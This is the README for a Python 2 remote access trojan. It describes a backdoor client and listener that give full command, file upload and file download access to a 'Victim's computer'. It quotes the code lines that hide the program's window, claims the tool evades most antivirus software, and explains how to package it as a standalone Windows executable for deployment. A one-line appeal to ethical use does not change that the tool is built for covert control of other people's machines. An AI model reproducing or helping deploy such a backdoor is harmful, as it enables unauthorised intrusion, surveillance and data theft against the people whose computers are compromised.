# RAT
## Advanced Client - Server connection, Get full access of Client's computer with backdoor.
### Follow the steps below for implementing Backdoor:

### FEATURES:
You will get complete access to Victim's computer.
You can run any command into that command prompt, navigate to any directory.
You can upload any file from your computer to Victim's computer.
You can also download the file from Victim's computer to your computer.
You can run all cmd commands.

#### Note: both the codes are in python 2. Some functions like JSON won't work in Python 3 properly until & unless JSON decode error is resolved, so it is recommended to use Python 2.
Make sure all the libraries are installed or you can install them by pip install <library name>
All the functions inside code are self explanatory.
the lines: The_program_to_hide = win32gui.GetForegroundWindow() & win32gui.ShowWindow(The_program_to_hide , win32con.SW_HIDE) is used to hide the window.
Make sure you use correct IP address and Port no.

### For Listener.
the IP address must be same as of hosting server IP or the IP of computer in which its being executed.
Do not use reserved port nos.
The if else part in the code is for multiple connectivity.
if you want to connect to mutiple clients then you can switch to them by selecting different values.
for eg: 1 for listerning in port 4444. 2 for 4445 etc.

#### Note: this works only on windows and its undetectable by almost many antivirus.

### .PY to .EXE - converting .py file to .exe( runs on any windows , doesn't require python)

module required: pyinstaller.
open command prompt, type pyinstaller yourfilenamewith extension --onefile
eg: pyinstaller backdoor.py --onefile

A 'dist' named folder will be created and you will find your exe file inside it.


### NOTE: PLEASE USE THIS FOR ETHICAL PURPOSE.


